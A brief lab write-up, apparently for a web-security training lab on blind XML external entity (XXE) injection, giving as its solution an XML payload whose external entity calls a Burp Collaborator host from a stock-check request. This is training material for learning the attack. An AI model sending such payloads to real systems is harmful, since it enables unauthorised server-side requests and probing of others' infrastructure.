# Lab: Blind XXE with out-of-band interaction
## Description
This lab was relatively simply. No extraction of data required. All you had to do, to solve it, was to trigger an out-of-band request.

## Solution
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://77cgpbqnvjgmexmj5fiivfpia9gz4o.burpcollaborator.net/"> ]>
<stockCheck>
  <productId>4</productId>
  <storeId>&xxe;</storeId>
</stockCheck>
```
